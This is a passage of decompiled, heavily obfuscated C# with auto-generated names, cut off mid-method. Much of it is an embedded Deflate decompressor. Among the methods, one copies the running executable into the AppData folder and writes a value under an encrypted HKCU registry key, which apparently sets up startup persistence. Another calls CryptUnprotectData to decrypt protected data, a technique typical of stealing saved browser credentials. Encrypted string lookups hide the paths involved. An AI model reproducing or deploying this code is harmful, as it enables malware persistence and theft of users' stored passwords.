				class31_0.int_4 = 12;
				((byte*)ptr)[12] = 0;
				break;
			}
			*(int*)ptr = Class42.smethod_107(class31_0.class32_0, 3);
			if (*(int*)ptr < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class42.smethod_63(class31_0.class32_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class31_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class42.smethod_121(class31_0.class32_0);
				class31_0.int_4 = 3;
				break;
			case 1:
				class31_0.class34_0 = Class30.Class34.class34_0;
				class31_0.class34_1 = Class30.Class34.class34_1;
				class31_0.int_4 = 7;
				break;
			case 2:
				class31_0.class35_0 = new Class30.Class35();
				class31_0.int_4 = 6;
				break;
			}
			((byte*)ptr)[12] = 1;
			break;
		case 3:
			if ((class31_0.int_8 = Class42.smethod_107(class31_0.class32_0, 16)) < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class42.smethod_63(class31_0.class32_0, 16);
			class31_0.int_4 = 4;
			goto case 4;
		case 4:
			*(int*)((byte*)ptr + 4) = Class42.smethod_107(class31_0.class32_0, 16);
			if (*(int*)((byte*)ptr + 4) < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class42.smethod_63(class31_0.class32_0, 16);
			class31_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 8) = Class42.smethod_25(class31_0.class33_0, class31_0.class32_0, class31_0.int_8);
			class31_0.int_8 -= *(int*)((byte*)ptr + 8);
			if (class31_0.int_8 == 0)
			{
				class31_0.int_4 = 2;
				((byte*)ptr)[12] = 1;
			}
			else
			{
				((byte*)ptr)[12] = ((!Class42.smethod_157(class31_0.class32_0)) ? ((byte)1) : ((byte)0));
			}
			break;
		case 6:
			if (!Class42.smethod_142(class31_0.class35_0, class31_0.class32_0))
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			class31_0.class34_0 = Class42.smethod_94(class31_0.class35_0);
			class31_0.class34_1 = Class42.smethod_64(class31_0.class35_0);
			class31_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			((byte*)ptr)[12] = (Class42.smethod_140(class31_0) ? ((byte)1) : ((byte)0));
			break;
		default:
			((byte*)ptr)[12] = 0;
			break;
		case 12:
			((byte*)ptr)[12] = 0;
			break;
		}
		return ((byte*)ptr)[12] != 0;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetModuleFileNameA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1);

	static void smethod_113(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_3 = bool_0;
	}

	static bool smethod_114()
	{
		Class42.smethod_79((Class51)new Class52());
		return true;
	}

	static int smethod_115(Class30.Class33 class33_0)
	{
		return class33_0.int_1;
	}

	unsafe static bool smethod_116(bool bool_0, bool bool_1, Class30.Class39 class39_0)
	{
		void* ptr = stackalloc byte[2];
		do
		{
			Class42.smethod_163(class39_0);
			bool bool_2 = bool_0 && class39_0.int_7 == class39_0.int_8;
			*(bool*)ptr = Class42.smethod_82(bool_1, class39_0, bool_2);
		}
		while (Class42.smethod_72(class39_0.class40_0) && *(bool*)ptr);
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	static void smethod_117(Class44 class44_0, Enum1 enum1_0, string string_0)
	{
		Class42.smethod_136(class44_0, enum1_0, string_0, string.Empty);
	}

	unsafe static int smethod_118(Class30.Class34 class34_0, Class30.Class32 class32_0)
	{
		void* ptr = stackalloc byte[20];
		int num;
		if ((num = Class42.smethod_107(class32_0, 9)) >= 0)
		{
			int num2;
			if ((num2 = class34_0.short_0[num]) >= 0)
			{
				Class42.smethod_63(class32_0, num2 & 0xF);
				*(int*)((byte*)ptr + 16) = num2 >> 4;
			}
			else
			{
				*(int*)ptr = -(num2 >> 4);
				*(int*)((byte*)ptr + 4) = num2 & 0xF;
				if ((num = Class42.smethod_107(class32_0, *(int*)((byte*)ptr + 4))) >= 0)
				{
					num2 = class34_0.short_0[*(int*)ptr | (num >> 9)];
					Class42.smethod_63(class32_0, num2 & 0xF);
					*(int*)((byte*)ptr + 16) = num2 >> 4;
				}
				else
				{
					*(int*)((byte*)ptr + 8) = Class42.smethod_26(class32_0);
					num = Class42.smethod_107(class32_0, *(int*)((byte*)ptr + 8));
					num2 = class34_0.short_0[*(int*)ptr | (num >> 9)];
					if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
					{
						Class42.smethod_63(class32_0, num2 & 0xF);
						*(int*)((byte*)ptr + 16) = num2 >> 4;
					}
					else
					{
						*(int*)((byte*)ptr + 16) = -1;
					}
				}
			}
		}
		else
		{
			*(int*)((byte*)ptr + 12) = Class42.smethod_26(class32_0);
			num = Class42.smethod_107(class32_0, *(int*)((byte*)ptr + 12));
			int num2 = class34_0.short_0[num];
			if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
			{
				Class42.smethod_63(class32_0, num2 & 0xF);
				*(int*)((byte*)ptr + 16) = num2 >> 4;
			}
			else
			{
				*(int*)((byte*)ptr + 16) = -1;
			}
		}
		return *(int*)((byte*)ptr + 16);
	}

	static void smethod_119(Exception exception_0, object object_0, object object_1, object object_2, object object_3)
	{
		Class42.smethod_45(exception_0, new object[4] { object_0, object_1, object_2, object_3 });
	}

	unsafe static string smethod_120(object object_0)
	{
		void* ptr = stackalloc byte[46];
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int)
			{
				*(int*)((byte*)ptr + 32) = (int)object_0;
				return ((int*)((byte*)ptr + 32))->ToString("x");
			}
			if (object_0 is long)
			{
				*(long*)ptr = (long)object_0;
				return ((long*)ptr)->ToString("x");
			}
			if (object_0 is short)
			{
				*(short*)((byte*)ptr + 40) = (short)object_0;
				return ((short*)((byte*)ptr + 40))->ToString("x");
			}
			if (object_0 is uint)
			{
				*(uint*)((byte*)ptr + 36) = (uint)object_0;
				return ((uint*)((byte*)ptr + 36))->ToString("x");
			}
			if (object_0 is ulong)
			{
				*(ulong*)((byte*)ptr + 8) = (ulong)object_0;
				return ((ulong*)((byte*)ptr + 8))->ToString("x");
			}
			if (object_0 is ushort)
			{
				*(ushort*)((byte*)ptr + 42) = (ushort)object_0;
				return ((ushort*)((byte*)ptr + 42))->ToString("x");
			}
			if (object_0 is byte)
			{
				((byte*)ptr)[44] = (byte)object_0;
				return ((byte*)ptr)[44].ToString("x");
			}
			if (object_0 is sbyte)
			{
				((byte*)ptr)[45] = (byte)(sbyte)object_0;
				return ((sbyte*)((byte*)ptr + 45))->ToString("x");
			}
			if (object_0 is IntPtr intPtr)
			{
				*(long*)((byte*)ptr + 16) = intPtr.ToInt64();
				return ((long*)((byte*)ptr + 16))->ToString("x");
			}
			if (object_0 is UIntPtr)
			{
				*(ulong*)((byte*)ptr + 24) = ((UIntPtr)object_0).ToUInt64();
				return ((ulong*)((byte*)ptr + 24))->ToString("x");
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	static void smethod_121(Class30.Class32 class32_0)
	{
		class32_0.uint_0 >>= class32_0.int_2 & 7;
		class32_0.int_2 &= -8;
	}

	static bool smethod_122(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class45_0.method_7();
	}

	static void smethod_123(int int_0, Class30.Stream0 stream0_0)
	{
		Class42.smethod_37(int_0, stream0_0);
		Class42.smethod_37(int_0 >> 16, stream0_0);
	}

	unsafe static int smethod_124(Class30.Class39 class39_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = ((class39_0.int_0 << 5) ^ class39_0.byte_0[class39_0.int_4 + 2]) & 0x7FFF;
		short num = (class39_0.short_1[class39_0.int_4 & 0x7FFF] = class39_0.short_0[*(int*)ptr]);
		class39_0.short_0[*(int*)ptr] = (short)class39_0.int_4;
		class39_0.int_0 = *(int*)ptr;
		*(int*)((byte*)ptr + 4) = num & 0xFFFF;
		return *(int*)((byte*)ptr + 4);
	}

	static void smethod_125(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static string smethod_126(string string_0, string string_1, string string_2)
	{
		string result = default(string);
		try
		{
			string[] array = Strings.Split(string_1, string_2, -1, (CompareMethod)0);
			string[] array2 = Strings.Split(array[1], string_0, -1, (CompareMethod)0);
			result = array2[0];
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	unsafe static void smethod_127()
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False")))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class42.smethod_161("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False"), overwrite: true);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, *(int*)((byte*)ptr + 4));
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			*(int*)((byte*)ptr + 4) = 1;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class42.smethod_161("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), writable: true);
				registryKey.SetValue(Class22.Class23.string_0, Class22.Class23.string_1);
				registryKey.Close();
				Thread.Sleep(5000);
				try
				{
					Class5.thread_3.Abort();
					break;
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2, *(int*)((byte*)ptr + 4));
					ProjectData.ClearProjectError();
					break;
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3, *(int*)((byte*)ptr + 4));
				if (*(int*)ptr == 3)
				{
					try
					{
						Class5.thread_3.Abort();
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4, *(int*)((byte*)ptr + 4));
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
					break;
				}
				checked
				{
					(*unchecked((int*)ptr))++;
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	unsafe static int smethod_128(int int_0)
	{
		void* ptr = stackalloc byte[16];
		if (int_0 > Class10.byte_0.Length)
		{
			*(int*)ptr = 0;
		}
		else
		{
			byte* num = (byte*)ptr + 4;
			*(int*)((byte*)ptr + 8) = checked(int_0 + 8);
			*(int*)num = int_0;
			while (true)
			{
				if (*(int*)((byte*)ptr + 4) <= *(int*)((byte*)ptr + 8))
				{
					if (*(int*)((byte*)ptr + 4) <= checked(Class10.byte_0.Length - 1))
					{
						if ((Class10.byte_0[*(int*)((byte*)ptr + 4)] & 0x80) == 128)
						{
							checked
							{
								(*unchecked((int*)((byte*)ptr + 4)))++;
								continue;
							}
						}
						*(int*)ptr = *(int*)((byte*)ptr + 4);
						break;
					}
					*(int*)ptr = 0;
					break;
				}
				*(int*)ptr = checked(int_0 + 8);
				break;
			}
		}
		*(int*)((byte*)ptr + 12) = *(int*)ptr;
		return *(int*)((byte*)ptr + 12);
	}

	static void smethod_129(Class30.Class39 class39_0)
	{
		class39_0.int_0 = (class39_0.byte_0[class39_0.int_4] << 5) ^ class39_0.byte_0[class39_0.int_4 + 1];
	}

	static void smethod_130(int int_0, Class30.Class40 class40_0)
	{
		class40_0.byte_0[class40_0.int_1++] = (byte)int_0;
		class40_0.byte_0[class40_0.int_1++] = (byte)(int_0 >> 8);
	}

	unsafe static int smethod_131(Class30.Class37 class37_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		while (int_0 >= 4)
		{
			*(int*)ptr += 2;
			int_0 >>= 1;
		}
		*(int*)((byte*)ptr + 4) = *(int*)ptr + int_0;
		return *(int*)((byte*)ptr + 4);
	}

	static void smethod_132(int int_0, int int_1, byte[] byte_0, Class30.Class40 class40_0)
	{
		Array.Copy(byte_0, int_0, class40_0.byte_0, class40_0.int_1, int_1);
		class40_0.int_1 += int_1;
	}

	unsafe static void smethod_133(Class30.Class37.Class38 class38_0)
	{
		void* ptr = stackalloc byte[16];
		int[] array = new int[class38_0.int_3];
		*(int*)ptr = 0;
		class38_0.short_1 = new short[class38_0.short_0.Length];
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class38_0.int_3)
		{
			array[*(int*)((byte*)ptr + 4)] = *(int*)ptr;
			*(int*)ptr += class38_0.int_2[*(int*)((byte*)ptr + 4)] << 15 - *(int*)((byte*)ptr + 4);
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < class38_0.int_1)
		{
			*(int*)((byte*)ptr + 12) = class38_0.byte_0[*(int*)((byte*)ptr + 8)];
			if (*(int*)((byte*)ptr + 12) > 0)
			{
				class38_0.short_1[*(int*)((byte*)ptr + 8)] = Class42.smethod_43(array[*(int*)((byte*)ptr + 12) - 1]);
				int[] array2;
				int[] array3 = (array2 = array);
				int num = *(int*)((byte*)ptr + 12) - 1;
				nint num2 = num;
				array3[num] = array2[num2] + (1 << 16 - *(int*)((byte*)ptr + 12));
			}
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	unsafe static int smethod_134(Class30.Class37.Class38 class38_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class38_0.short_0.Length)
		{
			*(int*)ptr += class38_0.short_0[*(int*)((byte*)ptr + 4)] * class38_0.byte_0[*(int*)((byte*)ptr + 4)];
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = *(int*)ptr;
		return *(int*)((byte*)ptr + 8);
	}

	static bool smethod_135(int int_0, ref Class16.Class17.Struct6 struct6_0, int int_1, int int_2, int int_3, ref Class16.Class17.Struct6 struct6_1, int int_4)
	{
		return false;
	}

	static void smethod_136(Class44 class44_0, Enum1 enum1_0, string string_0, string string_1)
	{
		class44_0.delegate2_0?.Invoke(class44_0, new EventArgs3(enum1_0, string_0, string_1));
	}

	static string smethod_137(Class44.Class48 class48_0)
	{
		return class48_0.string_1;
	}

	static Assembly[] smethod_138(Class45 class45_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class42.smethod_102() };
		}
	}

	unsafe static string smethod_139(int int_0, string string_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = -1;
		byte* num = (byte*)ptr + 4;
		*(int*)((byte*)ptr + 8) = Class10.string_0.Length;
		*(int*)num = 0;
		while (*(int*)((byte*)ptr + 4) <= *(int*)((byte*)ptr + 8))
		{
			if (Class10.string_0[*(int*)((byte*)ptr + 4)].ToLower().CompareTo(string_0.ToLower()) != 0)
			{
				checked
				{
					(*unchecked((int*)((byte*)ptr + 4)))++;
					continue;
				}
			}
			*(int*)ptr = *(int*)((byte*)ptr + 4);
			break;
		}
		if (*(int*)ptr == -1)
		{
			return null;
		}
		return Class42.smethod_58(int_0, *(int*)ptr);
	}

	unsafe static bool smethod_140(Class30.Class31 class31_0)
	{
		void* ptr = stackalloc byte[13];
		int num = Class42.smethod_108(class31_0.class33_0);
		while (true)
		{
			if (num >= 258)
			{
				*(int*)((byte*)ptr + 8) = class31_0.int_4;
				switch (*(int*)((byte*)ptr + 8))
				{
				case 7:
				{
					int num2;
					while (((num2 = Class42.smethod_118(class31_0.class34_0, class31_0.class32_0)) & -256) == 0)
					{
						Class42.smethod_56(class31_0.class33_0, num2);
						if (--num >= 258)
						{
							continue;
						}
						goto IL_01e3;
					}
					if (num2 >= 257)
					{
						class31_0.int_6 = Class30.Class31.int_0[num2 - 257];
						class31_0.int_5 = Class30.Class31.int_1[num2 - 257];
						goto case 8;
					}
					if (num2 < 0)
					{
						((byte*)ptr)[12] = 0;
						break;
					}
					class31_0.class34_1 = null;
					class31_0.class34_0 = null;
					class31_0.int_4 = 2;
					((byte*)ptr)[12] = 1;
					break;
				}
				case 8:
					if (class31_0.int_5 > 0)
					{
						class31_0.int_4 = 8;
						*(int*)ptr = Class42.smethod_107(class31_0.class32_0, class31_0.int_5);
						if (*(int*)ptr < 0)
						{
							((byte*)ptr)[12] = 0;
							break;
						}
						Class42.smethod_63(class31_0.class32_0, class31_0.int_5);
						class31_0.int_6 += *(int*)ptr;
					}
					class31_0.int_4 = 9;
					goto case 9;
				case 9:
				{
					int num2 = Class42.smethod_118(class31_0.class34_1, class31_0.class32_0);
					if (num2 >= 0)
					{
						class31_0.int_7 = Class30.Class31.int_2[num2];
						class31_0.int_5 = Class30.Class31.int_3[num2];
						goto case 10;
					}
					((byte*)ptr)[12] = 0;
					break;
				}
				case 10:
					if (class31_0.int_5 > 0)
					{
						class31_0.int_4 = 10;
						*(int*)((byte*)ptr + 4) = Class42.smethod_107(class31_0.class32_0, class31_0.int_5);
						if (*(int*)((byte*)ptr + 4) < 0)
						{
							((byte*)ptr)[12] = 0;
							break;
						}
						Class42.smethod_63(class31_0.class32_0, class31_0.int_5);
						class31_0.int_7 += *(int*)((byte*)ptr + 4);
					}
					Class42.smethod_164(class31_0.class33_0, class31_0.int_6, class31_0.int_7);
					num -= class31_0.int_6;
					class31_0.int_4 = 7;
					continue;
				default:
					continue;
					IL_01e3:
					((byte*)ptr)[12] = 1;
					break;
				}
			}
			else
			{
				((byte*)ptr)[12] = 1;
			}
			break;
		}
		return ((byte*)ptr)[12] != 0;
	}

	static void smethod_141(Exception exception_0, object object_0, object object_1)
	{
		Class42.smethod_45(exception_0, new object[2] { object_0, object_1 });
	}

	unsafe static bool smethod_142(Class30.Class35 class35_0, Class30.Class32 class32_0)
	{
		void* ptr = stackalloc byte[9];
		while (true)
		{
			switch (class35_0.int_2)
			{
			default:
				continue;
			case 5:
			{
				*(int*)((byte*)ptr + 4) = Class30.Class35.int_1[class35_0.int_7];
				int num = Class42.smethod_107(class32_0, *(int*)((byte*)ptr + 4));
				if (num >= 0)
				{
					Class42.smethod_63(class32_0, *(int*)((byte*)ptr + 4));
					num += Class30.Class35.int_0[class35_0.int_7];
					while (num-- > 0)
					{
						class35_0.byte_1[class35_0.int_8++] = class35_0.byte_2;
					}
					if (class35_0.int_8 == class35_0.int_6)
					{
						((byte*)ptr)[8] = 1;
						break;
					}
					goto IL_00a6;
				}
				((byte*)ptr)[8] = 0;
				break;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class42.smethod_118(class35_0.class34_0, class32_0)) & -16) == 0)
				{
					class35_0.byte_1[class35_0.int_8++] = (class35_0.byte_2 = (byte)num2);
					if (class35_0.int_8 != class35_0.int_6)
					{
						continue;
					}
					goto IL_02ab;
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class35_0.byte_2 = 0;
					}
					class35_0.int_7 = num2 - 16;
					class35_0.int_2 = 5;
					goto case 5;
				}
				((byte*)ptr)[8] = 0;
				break;
			}
			case 3:
				while (class35_0.int_8 < class35_0.int_5)
				{
					*(int*)ptr = Class42.smethod_107(class32_0, 3);
					if (*(int*)ptr >= 0)
					{
						Class42.smethod_63(class32_0, 3);
						class35_0.byte_0[Class30.Class35.int_9[class35_0.int_8]] = (byte)(*(uint*)ptr);
						class35_0.int_8++;
						continue;
					}
					goto IL_029d;
				}
				class35_0.class34_0 = new Class30.Class34(class35_0.byte_0);
				class35_0.byte_0 = null;
				class35_0.int_8 = 0;
				class35_0.int_2 = 4;
				goto case 4;
			case 2:
				class35_0.int_5 = Class42.smethod_107(class32_0, 4);
				if (class35_0.int_5 >= 0)
				{
					class35_0.int_5 += 4;
					Class42.smethod_63(class32_0, 4);
					class35_0.byte_0 = new byte[19];
					class35_0.int_8 = 0;
					class35_0.int_2 = 3;
					goto case 3;
				}
				((byte*)ptr)[8] = 0;
				break;
			case 1:
				class35_0.int_4 = Class42.smethod_107(class32_0, 5);
				if (class35_0.int_4 >= 0)
				{
					class35_0.int_4++;
					Class42.smethod_63(class32_0, 5);
					class35_0.int_6 = class35_0.int_3 + class35_0.int_4;
					class35_0.byte_1 = new byte[class35_0.int_6];
					class35_0.int_2 = 2;
					goto case 2;
				}
				((byte*)ptr)[8] = 0;
				break;
			case 0:
				{
					class35_0.int_3 = Class42.smethod_107(class32_0, 5);
					if (class35_0.int_3 >= 0)
					{
						class35_0.int_3 += 257;
						Class42.smethod_63(class32_0, 5);
						class35_0.int_2 = 1;
						goto case 1;
					}
					((byte*)ptr)[8] = 0;
					break;
				}
				IL_02ab:
				((byte*)ptr)[8] = 1;
				break;
				IL_029d:
				((byte*)ptr)[8] = 0;
				break;
			}
			break;
			IL_00a6:
			class35_0.int_2 = 4;
		}
		return ((byte*)ptr)[8] != 0;
	}

	unsafe static int smethod_143(string string_0, Class45 class45_0)
	{
		void* ptr = stackalloc byte[18];
		try
		{
			((byte*)ptr)[16] = ((class45_0.char_0[0] == '\u0001') ? ((byte)1) : ((byte)0));
			if (string_0 != null && string_0.Length != 0 && (((byte*)ptr)[16] == 0 || string_0.Length <= 4) && (((byte*)ptr)[16] != 0 || string_0[0] == '#'))
			{
				*(int*)ptr = 0;
				*(int*)((byte*)ptr + 4) = string_0.Length - 1;
				while (true)
				{
					if (*(int*)((byte*)ptr + 4) >= 0 && (((byte*)ptr)[16] != 0 || *(int*)((byte*)ptr + 4) != 0))
					{
						char c = string_0[*(int*)((byte*)ptr + 4)];
						((byte*)ptr)[17] = 0;
						*(int*)((byte*)ptr + 8) = 0;
						while (*(int*)((byte*)ptr + 8) < class45_0.char_0.Length)
						{
							if (class45_0.char_0[*(int*)((byte*)ptr + 8)] != c)
							{
								(*(int*)((byte*)ptr + 8))++;
								continue;
							}
							*(int*)ptr = *(int*)ptr * class45_0.char_0.Length + *(int*)((byte*)ptr + 8);
							((byte*)ptr)[17] = 1;
							break;
						}
						if (((byte*)ptr)[17] != 0)
						{
							(*(int*)((byte*)ptr + 4))--;
							continue;
						}
						*(int*)((byte*)ptr + 12) = -1;
						break;
					}
					*(int*)((byte*)ptr + 12) = *(int*)ptr;
					break;
				}
			}
			else
			{
				*(int*)((byte*)ptr + 12) = -1;
			}
		}
		catch
		{
			*(int*)((byte*)ptr + 12) = -1;
		}
		return *(int*)((byte*)ptr + 12);
	}

	static void smethod_144(Class30.Class37.Class38 class38_0, int int_0)
	{
		Class42.smethod_167(class38_0.class37_0.class40_0, class38_0.short_1[int_0] & 0xFFFF, (int)class38_0.byte_0[int_0]);
	}

	static Class51 smethod_145()
	{
		if (Class51.class51_0 == null)
		{
			Type[] types = Assembly.GetExecutingAssembly().GetTypes();
			foreach (Type type in types)
			{
				if ((object)type == null || (object)type.BaseType == null || (object)type.BaseType != typeof(Class51))
				{
					continue;
				}
				try
				{
					Class51.class51_0 = (Class51)Activator.CreateInstance(type, nonPublic: true);
					if (Class51.class51_0 != null)
					{
						break;
					}
				}
				catch
				{
				}
			}
		}
		return Class51.class51_0;
	}

	unsafe static int smethod_146(int int_0, int int_1, Class30.Class33 class33_0, byte[] byte_0)
	{
		void* ptr = stackalloc byte[16];
		*(int*)ptr = class33_0.int_0;
		if (int_1 > class33_0.int_1)
		{
			int_1 = class33_0.int_1;
		}
		else
		{
			*(int*)ptr = (class33_0.int_0 - class33_0.int_1 + int_1) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_1;
		*(int*)((byte*)ptr + 8) = int_1 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class33_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_0, *(int*)((byte*)ptr + 8));
			int_0 += *(int*)((byte*)ptr + 8);
			int_1 = *(int*)ptr;
		}
		Array.Copy(class33_0.byte_0, *(int*)ptr - int_1, byte_0, int_0, int_1);
		class33_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class33_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 4);
		return *(int*)((byte*)ptr + 12);
	}

	static string smethod_147(byte[] byte_0)
	{
		Class9.Struct1 struct1_ = default(Class9.Struct1);
		Class9.Struct1 struct1_2 = default(Class9.Struct1);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		struct1_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct1_.int_0 = byte_0.Length;
		gCHandle.Free();
		Class9.Struct1 @struct = default(Class9.Struct1);
		Class9.Struct1 struct1_3 = @struct;
		Class9.Struct0 struct2 = default(Class9.Struct0);
		Class9.Struct0 struct0_ = struct2;
		IntPtr intptr_ = default(IntPtr);
		Class42.CryptUnprotectData(ref struct1_, (string)null, ref struct1_3, intptr_, ref struct0_, 0, ref struct1_2);
		checked
		{
			byte[] array = new byte[struct1_2.int_0 + 1];
			Marshal.Copy(struct1_2.intptr_0, array, 0, struct1_2.int_0);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	static void smethod_148(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class42.smethod_45(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static int smethod_149(Class30.Class32 class32_0)
	{
		return class32_0.int_1 - class32_0.int_0 + (class32_0.int_2 >> 3);
	}

	static byte[] smethod_150(byte[] byte_0)
	{
		return Class42.smethod_15((byte[])null, (byte[])null, 1, byte_0);
	}

	static string smethod_151()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	static bool smethod_152(Class49 class49_0)
	{
		return class49_0.bool_0;
	}

	unsafe static int smethod_153(Class30.Class37 class37_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		if (int_0 == 255)
		{
			*(int*)((byte*)ptr + 4) = 285;
		}
		else
		{
			*(int*)ptr = 257;
			while (int_0 >= 8)
			{
				*(int*)ptr += 4;
				int_0 >>= 1;
			}
			*(int*)((byte*)ptr + 4) = *(int*)ptr + int_0;
		}
		return *(int*)((byte*)ptr + 4);
	}

	static int smethod_154(Class30.Stream0 stream0_0)
	{
		return Class42.smethod_80(stream0_0) | (Class42.smethod_80(stream0_0) << 16);
	}

	static string smethod_155(Class44.Class48 class48_0)
	{
		return class48_0.string_2;
	}

	static void smethod_156(Class44 class44_0, Enum1 enum1_0)
	{
		Class42.smethod_117(class44_0, enum1_0, string.Empty);
	}

	static bool smethod_157(Class30.Class32 class32_0)
	{
		return class32_0.int_0 == class32_0.int_1;
	}

	unsafe static void smethod_158(byte[] byte_0, Class30.Class34 class34_0)
	{
		void* ptr = stackalloc byte[68];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)ptr = 0;
		while (*(int*)ptr < byte_0.Length)
		{
			*(int*)((byte*)ptr + 4) = byte_0[*(int*)ptr];
			if (*(int*)((byte*)ptr + 4) > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				int num = *(int*)((byte*)ptr + 4);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 512;
		*(int*)((byte*)ptr + 16) = 1;
		while (*(int*)((byte*)ptr + 16) <= 15)
		{
			array2[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 8);
			*(int*)((byte*)ptr + 8) += array[*(int*)((byte*)ptr + 16)] << 16 - *(int*)((byte*)ptr + 16);
			if (*(int*)((byte*)ptr + 16) >= 10)
			{
				*(int*)((byte*)ptr + 20) = array2[*(int*)((byte*)ptr + 16)] & 0x1FF80;
				*(int*)((byte*)ptr + 24) = *(int*)((byte*)ptr + 8) & 0x1FF80;
				*(int*)((byte*)ptr + 12) += *(int*)((byte*)ptr + 24) - *(int*)((byte*)ptr + 20) >> 16 - *(int*)((byte*)ptr + 16);
			}
			(*(int*)((byte*)ptr + 16))++;
		}
		class34_0.short_0 = new short[*(int*)((byte*)ptr + 12)];
		*(int*)((byte*)ptr + 28) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 8) -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 44) = *(int*)((byte*)ptr + 40);
			while (*(int*)((byte*)ptr + 44) < *(int*)((byte*)ptr + 36))
			{
				class34_0.short_0[Class42.smethod_43(*(int*)((byte*)ptr + 44))] = (short)((-(*(int*)((byte*)ptr + 28)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 28) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 44) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 48) = 0;
		while (*(int*)((byte*)ptr + 48) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 52) = byte_0[*(int*)((byte*)ptr + 48)];
			if (*(int*)((byte*)ptr + 52) != 0)
			{
				*(int*)((byte*)ptr + 8) = array2[*(int*)((byte*)ptr + 52)];
				*(int*)((byte*)ptr + 56) = Class42.smethod_43(*(int*)((byte*)ptr + 8));
				if (*(int*)((byte*)ptr + 52) <= 9)
				{
					do
					{
